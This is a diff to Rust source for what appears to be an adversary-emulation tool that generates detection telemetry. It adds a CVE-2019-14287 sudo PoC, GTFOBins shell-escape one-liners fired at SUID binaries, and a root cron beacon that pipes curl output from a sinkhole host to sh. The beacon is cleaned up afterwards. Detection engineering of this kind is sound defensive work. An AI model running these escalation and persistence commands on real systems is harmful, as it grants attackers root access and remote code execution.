@@ -2,6 +2,7 @@
 // SPDX-License-Identifier: AGPL-3.0-or-later
 
 use crate::config::TechniqueConfig;
+use crate::techniques::container_escape::{log_privesc_verification, verify_command};
 use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
 use crate::techniques::{CleanupFuture, ExecuteFuture};
 use async_trait::async_trait;
@@ -10,6 +11,7 @@ use std::fs::{self, File};
 use std::io::Write;
 use std::path::Path;
 use tokio::process::Command;
+use uuid::Uuid;
 
 // Forensic attribution of this code would reveal Simon Sigre's distinctive patterns
 pub struct SudoersModification {}
@@ -83,6 +85,7 @@ impl AttackTechnique for SudoersModification {
                 if test_sudo {
                     info!("[DRY RUN] - Test sudo access with: sudo -n whoami");
                 }
+                info!("[DRY RUN] - Would verify EUID via sudo -n id -u -> [VERIFIED] + [CRITICAL] Privilege escalation VERIFIED, or [UNVERIFIED]");
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
@@ -271,6 +274,23 @@ impl AttackTechnique for SudoersModification {
                 }
             }
 
+            // Post-escalation EUID verification via shared helpers: sudo -n id -u
+            info!("[T1548.003] Verifying EUID via sudo -n id -u");
+            let euid_result_1548_003 = verify_command(
+                "T1548.003",
+                "sudo",
+                &["-n", "id", "-u"],
+                5000,
+                |stdout| stdout.trim() == "0",
+            )
+            .await;
+            log_privesc_verification("T1548.003", &euid_result_1548_003);
+            let sudo_verify_marker = if euid_result_1548_003.verified {
+                format!("[VERIFIED] {}", euid_result_1548_003.evidence)
+            } else {
+                format!("[UNVERIFIED] {}", euid_result_1548_003.evidence)
+            };
+
             let success_message = format!(
                 "Successfully performed REAL sudoers modification:\n  \
                 [OK] Backed up {backup_count} existing files to {backup_dir}\n  \
@@ -278,7 +298,8 @@ impl AttackTechnique for SudoersModification {
                 [OK] Added NOPASSWD rule: {username} ALL=(ALL) NOPASSWD: ALL\n  \
                 [OK] Validated syntax with visudo\n  \
                 [OK] Set permissions: 440 (r--r-----)\n  \
-                [OK] File is now ACTIVE and will grant passwordless sudo to {username}{test_result}"
+                [OK] File is now ACTIVE and will grant passwordless sudo to {username}{test_result}\n  \
+                [OK] EUID verification: {sudo_verify_marker}"
             );
 
             info!("{success_message}");
@@ -475,6 +496,7 @@ impl AttackTechnique for SuidBinary {
                 if test_execution {
                     info!("[DRY RUN] - Test execution to demonstrate privilege escalation");
                 }
+                info!("[DRY RUN] - Would verify EUID from binary output -> [VERIFIED] + [CRITICAL] Privilege escalation VERIFIED, or [UNVERIFIED]");
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
@@ -646,6 +668,35 @@ int main() {
                 }
             }
 
+            // Post-escalation EUID verification via shared helpers: invoke the SUID binary
+            // and check whether it ran with Effective UID: 0 in its output.
+            info!("[T1548.001] Verifying EUID from SUID binary output");
+            let mut euid_result_1548_001 = verify_command(
+                "T1548.001",
+                &binary_file,
+                &[],
+                5000,
+                |stdout| {
+                    stdout.lines().any(|l| {
+                        l.split("Effective UID:")
+                            .nth(1)
+                            .and_then(|s| s.trim().parse::<u32>().ok())
+                            == Some(0)
+                    })
+                },
+            )
+            .await;
+            if euid_result_1548_001.verified {
+                euid_result_1548_001.evidence =
+                    "SUID binary ran with Effective UID: 0".to_string();
+            }
+            log_privesc_verification("T1548.001", &euid_result_1548_001);
+            let suid_verify_marker = if euid_result_1548_001.verified {
+                format!("[VERIFIED] {}", euid_result_1548_001.evidence)
+            } else {
+                format!("[UNVERIFIED] {}", euid_result_1548_001.evidence)
+            };
+
             // Optional - Test execution
             let mut test_result = String::new();
             if test_execution {
@@ -690,7 +741,8 @@ int main() {
                 [OK] Changed ownership to root:root\n  \
                 [OK] Set SUID bit (chmod u+s)\n  \
                 [OK] Verified SUID bit set (rws permissions)\n  \
-                [OK] Binary is now ACTIVE and can escalate privileges{test_result}"
+                [OK] Binary is now ACTIVE and can escalate privileges{test_result}\n  \
+                [OK] EUID verification: {suid_verify_marker}"
             );
 
             info!("{success_message}");
@@ -1343,10 +1395,57 @@ impl AttackTechnique for PrivilegeEscalationExploit {
             let mut docker_container_ran = false;
             let mut sudo_commands_tested = Vec::new();
 
-            // 1. Enumerate SUID binaries
+            // 0. CVE-2019-14287 PoC attempt
+            // The canonical published PoC for T1068 sudo privilege escalation:
+            // `sudo -u#-1 id` exploited sudo's RunAs handling on pre-1.8.28
+            // versions by reinterpreting -1 as UID 0. The exec attempt is the
+            // telemetry event regardless of whether the system is patched; on
+            // patched sudo it fails with an authentication error that still
+            // shows up in /var/log/auth.log as "user attempted -u#-1".
+            writeln!(log, "\n[0] CVE-2019-14287 PoC ATTEMPT").unwrap();
+            writeln!(log, "Command: sudo -u#-1 id").unwrap();
+            writeln!(
+                log,
+                "─────────────────────────────────────────────────────────────────────"
+            )
+            .unwrap();
+            info!("Attempting CVE-2019-14287 PoC: sudo -u#-1 id");
+            match Command::new("sudo")
+                .args(["-n", "-u#-1", "id"])
+                .output()
+                .await
+            {
+                Ok(out) => {
+                    let stdout = String::from_utf8_lossy(&out.stdout);
+                    let stderr = String::from_utf8_lossy(&out.stderr);
+                    writeln!(
+                        log,
+                        "  exit={:?} stdout={} stderr={}",
+                        out.status.code(),
+                        stdout.trim(),
+                        stderr.trim()
+                    )
+                    .unwrap();
+                    if out.status.success() && stdout.trim().contains("uid=0") {
+                        writeln!(log, "  [CRITICAL] CVE-2019-14287 succeeded - sudo is unpatched")
+                            .unwrap();
+                        findings.push("CVE-2019-14287 succeeded".to_string());
+                        info!("[CRITICAL] CVE-2019-14287 sudo exploit succeeded");
+                    } else {
+                        info!(
+                            "CVE-2019-14287 attempt completed (expected to fail on patched sudo)"
+                        );
+                    }
+                }
+                Err(e) => {
+                    writeln!(log, "  sudo invocation failed: {e}").unwrap();
+                }
+            }
+
+            // 1. Enumerate SUID binaries and invoke GTFOBin patterns
             if suid_scan {
                 info!("Enumerating SUID binaries (find / -perm -4000)...");
-                writeln!(log, "\n[1] SUID BINARY ENUMERATION").unwrap();
+                writeln!(log, "\n[1] SUID BINARY ENUMERATION + GTFOBin INVOCATION").unwrap();
                 writeln!(log, "Command: find / -perm -4000 -type f 2>/dev/null").unwrap();
                 writeln!(
                     log,
@@ -1364,6 +1463,7 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                     "/sbin",
                 ];
 
+                let mut suid_paths: Vec<String> = Vec::new();
                 for search_path in &search_paths {
                     if Path::new(search_path).exists() {
                         let output = Command::new("find")
@@ -1378,6 +1478,7 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                                 if !binary.is_empty() {
                                     suid_count += 1;
                                     writeln!(log, "  [SUID] {binary}").unwrap();
+                                    suid_paths.push(binary.to_string());
                                 }
                             }
                         }
@@ -1389,6 +1490,84 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                     info!("[OK] Found {suid_count} SUID binaries");
                 } else {
                     writeln!(log, "  No SUID binaries found in common directories").unwrap();
+                }
+
+                // GTFOBin invocation phase. For each discovered SUID binary
+                // whose basename matches a known GTFOBin pattern, fire the
+                // canonical shell-escape invocation. Each is wrapped in
+                // `timeout 1 sh -c` so the spawned shell exits immediately;
+                // the exec attempt is the telemetry. Patterns are sourced from
+                // gtfobins.github.io published PoCs.
+                let gtfobin_invocations: &[(&str, &str)] = &[
+                    (
+                        "find",
+                        "timeout 1 {bin} . -name nonexistent -exec /bin/sh -p -c id \\; -quit",
+                    ),
+                    (
+                        "awk",
+                        "timeout 1 {bin} 'BEGIN {{ system(\"/bin/sh -p -c id\") }}'",
+                    ),
+                    (
+                        "python",
+                        "timeout 1 {bin} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\", \"-c\", \"id\")'",
+                    ),
+                    (
+                        "python3",
+                        "timeout 1 {bin} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\", \"-c\", \"id\")'",
+                    ),
+                    (
+                        "perl",
+                        "timeout 1 {bin} -e 'exec \"/bin/sh\", \"-p\", \"-c\", \"id\"'",
+                    ),
+                    ("env", "timeout 1 {bin} /bin/sh -p -c id"),
+                    (
+                        "vim",
+                        "timeout 1 {bin} -E -s -c ':!/bin/sh -p -c id' -c ':qa!' < /dev/null",
+                    ),
+                    (
+                        "less",
+                        "timeout 1 {bin} -c ':!/bin/sh -p -c id' /etc/profile < /dev/null",
+                    ),
+                ];
+
+                let mut gtfobin_attempts = 0;
+                for path in &suid_paths {
+                    let basename = Path::new(path)
+                        .file_name()
+                        .and_then(|s| s.to_str())
+                        .unwrap_or("");
+                    if let Some((_, template)) =
+                        gtfobin_invocations.iter().find(|(n, _)| *n == basename)
+                    {
+                        let cmd = template.replace("{bin}", path);
+                        writeln!(log, "  GTFOBin attempt: {cmd}").unwrap();
+                        info!("GTFOBin invocation on SUID {basename}");
+                        match Command::new("/bin/sh")
+                            .arg("-c")
+                            .arg(format!("{cmd} < /dev/null > /dev/null 2>&1"))
+                            .output()
+                            .await
+                        {
+                            Ok(out) => {
+                                writeln!(
+                                    log,
+                                    "    -> exit={:?}",
+                                    out.status.code()
+                                )
+                                .unwrap();
+                                gtfobin_attempts += 1;
+                            }
+                            Err(e) => writeln!(log, "    -> spawn failed: {e}").unwrap(),
+                        }
+                    }
+                }
+                if gtfobin_attempts > 0 {
+                    findings.push(format!(
+                        "{gtfobin_attempts} GTFOBin SUID invocations attempted"
+                    ));
+                    info!(
+                        "Attempted {gtfobin_attempts} GTFOBin shell-escape invocations on SUID binaries"
+                    );
                 }
             }
 
@@ -1569,6 +1748,8 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                 )
                 .unwrap();
 
+                let mut writable_cron_files: Vec<String> = Vec::new();
+
                 // Check /etc/crontab
                 if Path::new("/etc/crontab").exists() {
                     let metadata = fs::metadata("/etc/crontab");
@@ -1580,6 +1761,7 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                             writable_cron_count += 1;
                             writeln!(log, "  [WRITABLE] /etc/crontab (permissions: {mode:o})")
                                 .unwrap();
+                            writable_cron_files.push("/etc/crontab".to_string());
                         }
                     }
                 }
@@ -1599,6 +1781,7 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                                 if !file.is_empty() {
                                     writable_cron_count += 1;
                                     writeln!(log, "  [WRITABLE] {file}").unwrap();
+                                    writable_cron_files.push(file.to_string());
                                 }
                             }
                         }
@@ -1610,6 +1793,81 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                     info!("[OK] Found {writable_cron_count} writable cron files");
                 } else {
                     writeln!(log, "  No writable cron files found").unwrap();
+                }
+
+                // Cron exploitation: append a recognisable malicious-looking
+                // line to each writable cron file. The line is the canonical
+                // "cron beacon" pattern that fires "cron command fetches and
+                // executes remote script" detection rules. The original file is
+                // backed up first; cleanup restores from the backup so the
+                // system is unchanged after the technique completes.
+                if !writable_cron_files.is_empty() {
+                    let sinkhole_for_cron =
+                        crate::techniques::resolve_sinkhole_ip().await;
+                    let session_marker = Uuid::new_v4()
+                        .to_string()
+                        .split('-')
+                        .next()
+                        .unwrap_or("sb")
+                        .to_string();
+                    writeln!(log, "\n  Cron exploitation: appending beacon line to writable files")
+                        .unwrap();
+                    for cron_file in &writable_cron_files {
+                        let backup_path = format!(
+                            "/tmp/signalbench_cron_backup_{session_marker}_{}",
+                            Path::new(cron_file)
+                                .file_name()
+                                .and_then(|s| s.to_str())
+                                .unwrap_or("file")
+                        );
+                        match fs::copy(cron_file, &backup_path) {
+                            Ok(_) => {
+                                // Beacon line tagged with the session marker so
+                                // cleanup can target the exact line we added.
+                                let beacon_line = format!(
+                                    "* * * * * root /bin/sh -c 'curl -s http://{sinkhole_for_cron}/sb-{session_marker} | sh' # signalbench-{session_marker}\n"
+                                );
+                                let append_result = std::fs::OpenOptions::new()
+                                    .append(true)
+                                    .open(cron_file)
+                                    .and_then(|mut f| {
+                                        use std::io::Write;
+                                        f.write_all(beacon_line.as_bytes())
+                                    });
+                                match append_result {
+                                    Ok(_) => {
+                                        writeln!(
+                                            log,
+                                            "  [APPENDED] beacon line to {cron_file} (backup at {backup_path})"
+                                        )
+                                        .unwrap();
+                                        info!("Appended cron beacon line to {cron_file}");
+                                        findings.push(format!(
+                                            "Cron beacon appended to {cron_file}"
+                                        ));
+                                        artifacts.push(format!(
+                                            "cron_append:{cron_file}:{backup_path}"
+                                        ));
+                                    }
+                                    Err(e) => {
+                                        writeln!(
+                                            log,
+                                            "  [FAIL] append to {cron_file} failed: {e}"
+                                        )
+                                        .unwrap();
+                                        let _ = fs::remove_file(&backup_path);
+                                    }
+                                }
+                            }
+                            Err(e) => {
+                                writeln!(
+                                    log,
+                                    "  [FAIL] backup of {cron_file} failed: {e} (skipping append)"
+                                )
+                                .unwrap();
+                            }
+                        }
+                    }
                 }
             }
 
@@ -2249,6 +2507,29 @@ impl AttackTechnique for PrivilegeEscalationExploit {
                         }
                         Err(e) => {
                             warn!("Error stopping systemd service: {e}");
+                        }
+                    }
+                } else if let Some(rest) = artifact.strip_prefix("cron_append:") {
+                    // Format: cron_append:<cron_file>:<backup_path>
+                    let parts: Vec<&str> = rest.splitn(2, ':').collect();
+                    if parts.len() == 2 {
+                        let cron_file = parts[0];
+                        let backup_path = parts[1];
+                        info!(
+                            "Restoring {cron_file} from backup {backup_path} (T1068 cron exploit cleanup)"
+                        );
+                        if Path::new(backup_path).exists() {
+                            match fs::copy(backup_path, cron_file) {
+                                Ok(_) => {
+                                    info!("[OK] Restored {cron_file} from backup");
+                                    let _ = fs::remove_file(backup_path);
+                                }
+                                Err(e) => {
+                                    warn!("Failed to restore {cron_file} from backup: {e}");
+                                }
+                            }
+                        } else {
+                            warn!("Backup {backup_path} missing - leaving {cron_file} as-is");
                         }
                     }
                 } else if artifact.starts_with("systemd:") {
